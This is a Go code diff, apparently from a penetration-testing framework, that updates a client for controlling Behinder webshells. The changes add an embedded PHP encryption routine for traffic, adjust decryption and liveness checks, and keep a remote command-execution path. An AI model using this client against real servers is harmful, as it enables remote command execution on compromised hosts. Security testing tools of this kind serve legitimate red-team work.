@@ -5,15 +5,14 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/yaklang/yaklang/common/log"
 	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/utils/lowhttp"
 	"github.com/yaklang/yaklang/common/utils/lowhttp/poc"
 	"github.com/yaklang/yaklang/common/wsm/payloads"
 	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
 	"github.com/yaklang/yaklang/common/yak"
-	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
 	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
+	"strings"
 )
 
 //type WsmClient interface {
@@ -43,6 +42,11 @@ type Behinder struct {
 	customPacketEncoder  codecFunc
 }
 
+var defaultPHPEchoEncoder codecFunc = func(raw []byte) ([]byte, error) {
+	classBase64Str := "\nfunction encrypt($data,$key)\n{\nif(!extension_loaded('openssl'))\n{\nfor($i=0;$i<strlen($data);$i++) {\n$data[$i] = $data[$i]^$key[$i+1&15];\n}\nreturn $data;\n}else{\nreturn openssl_encrypt($data, 'AES128' , $key);\n}\n}"
+	return []byte(classBase64Str), nil
+}
+
 func NewBehinder(ys *ypb.WebShell) (*Behinder, error) {
 	bs := &Behinder{
 		Url:           ys.GetUrl(),
@@ -61,6 +65,10 @@ func NewBehinder(ys *ypb.WebShell) (*Behinder, error) {
 }
 
 func (b *Behinder) echoResultEncode(raw []byte) ([]byte, error) {
+	// 如果没有自定义的数据包编码器，也没有自定义的回显解码器，就代表使用的是冰蝎3 的版本
+	if b.customPacketEncoder == nil && b.customEchoDecoder == nil {
+		b.customEchoEncoder = defaultPHPEchoEncoder
+	}
 	if b.customEchoEncoder != nil {
 		return b.customEchoEncoder(raw)
 	}
@@ -76,11 +84,11 @@ func (b *Behinder) EchoResultEncodeFormYak(raw []byte) ([]byte, error) {
 		"YAK_FILENAME": "req.GetScriptName()",
 	})
 	if err != nil {
-		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
+		return nil, utils.Errorf("execute file %s code failed: %s", "EchoResultEncodeFormYak", err.Error())
 	}
 	result, err := engine.CallYakFunction(context.Background(), "wsmPayloadEncoder", []interface{}{raw})
 	if err != nil {
-		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
+		return nil, utils.Errorf("import %v' s handle failed: %s", "EchoResultEncodeFormYak", err)
 	}
 	rspBytes := utils.InterfaceToBytes(result)
 
@@ -232,12 +240,7 @@ func (b *Behinder) deCryption(raw []byte) ([]byte, error) {
 	//} else {
 	//	targetBts = raw
 	//}
-	// 冰蝎4 的 AES 加密结果套了一层 base64
-	res, err := codec.DecodeBase64(string(raw))
-	if err != nil {
-		return nil, err
-	}
-	return behinder.Decryption(res, b.SecretKey, b.ShellScript)
+	return behinder.Decryption(raw, b.SecretKey, b.ShellScript)
 }
 
 func (b *Behinder) sendHttpRequest(data []byte) ([]byte, error) {
@@ -375,30 +378,28 @@ func (b *Behinder) sendRequestAndGetResponse(payloadType payloads.Payload, param
 }
 
 func (b *Behinder) Ping(opts ...behinder.ExecParamsConfig) (bool, error) {
+	randStr := utils.RandSampleInRange(50, 200)
 	params := map[string]string{
-		"content": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+		"content": randStr,
 	}
 	b.processParams(params)
 
-	payload, err := b.getPayload(payloads.EchoGo, params)
+	res, err := b.sendRequestAndGetResponse(payloads.EchoGo, params)
 	if err != nil {
 		return false, err
 	}
-	//
-	//res, err := b.sendPayload(payload)
-	res, err := b.sendHttpRequest(payload)
-	if err != nil {
-		return false, err
+	if strings.Contains(string(res), randStr) {
+		return true, nil
 	}
-	log.Infof("%q", res)
-	return true, nil
+	return false, nil
 }
 
 func (b *Behinder) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) {
+	randStr := utils.RandSampleInRange(50, 200)
 	params := map[string]string{
-		"whatever": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+		"whatever": randStr,
 	}
-	params = behinder.ProcessParams(params, opts...)
+	b.processParams(params)
 	return b.sendRequestAndGetResponse(payloads.BasicInfoGo, params)
 }
 
@@ -409,8 +410,4 @@ func (b *Behinder) CommandExec(cmd string, opts ...behinder.ExecParamsConfig) ([
 	}
 	b.processParams(params)
 	return b.sendRequestAndGetResponse(payloads.CmdGo, params)
-}
-
-func (b *Behinder) FileManagement() {
-
 }
